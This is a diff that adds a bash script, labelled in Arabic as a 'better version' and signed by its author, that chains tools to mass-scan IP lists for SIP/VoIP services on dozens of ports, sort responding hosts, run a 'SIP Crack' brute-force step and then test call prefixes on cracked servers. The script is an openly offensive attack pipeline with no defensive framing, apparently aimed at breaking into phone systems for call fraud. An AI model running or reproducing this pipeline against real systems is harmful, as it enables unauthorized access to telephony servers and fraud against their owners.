@@ -6389,3 +6389,65 @@ sleep 1
 
 echo -e "\nEnding crack !\n"
 echo -e "\nby Mohammad Elnwajha\n"
+
+
+================================================
+نسخة افضل
+
+
+#!/bin/bash
+
+# Scan IPv4 range on ports
+echo -e "\nStart scanning ...\n"
+
+while read -r ip; do
+	echo "Checking $ip";
+	python svmap.bu.py $ip -p5060,6072,6073,7073,6069,6079,6099,6089,5059,5260,5061,5070,5069,6655,5038,5080,5062,15060,6050,6051,5063,5064,5065,5067,5068,5071,5072,5073,5076,5075,5077,5078,1020,5079,1021,1022,1023,6052,6053,6054,6055,6057,6058,6059,6061,6062,6063,6070,6064,6080,6010,5090,5566,9060,4002,5678,5088,6020,5600,5160,1025,9090,5506,6060 -t0.0 -v >> output.txt
+done < ip.txt
+
+sleep 1
+
+grep -Po "(\d+\.){3}\d+:?(\d?){6}" output.txt >>ok.txt
+sort -u ok.txt > IPS
+rm ok.txt # remove the file IPS
+
+echo -e "\nEnding scanning port !\n"
+
+# SIP Responses
+
+echo -e "\nStart SIP Responses ...\n"
+
+perl run IPS
+cat 401.pal 403.pal 404.pal >> sipsip
+grep -Po "([0-2]?\d?\d\.){3}[0-2]?\d?\d" output.txt >>ipSIP
+rm IPS # remove the file IPS
+rm sipsip # remove the file IPS
+sleep 2
+
+# SIP Crack
+
+echo -e "\nStart SIP Crack ...\n"
+
+python test.py ipSIP 2000
+rm ipSIP # remove the file ipSIP
+rm *.pal # remove the file
+
+sleep 2
+
+# Replace-comma space
+
+echo -e "\nStart comma space ...\n"
+
+sed 's/, / /g' results.txt >ips
+
+echo -e "\nEnding comma space !\n"
+
+# Testing SIP prefix
+
+echo -e "\nStart Testing ...\n"
+
+perl call ips 500 30
+sleep 1
+
+echo -e "\nEnding crack !\n"
+echo -e "\nby Mohammad Elnwajha\n"
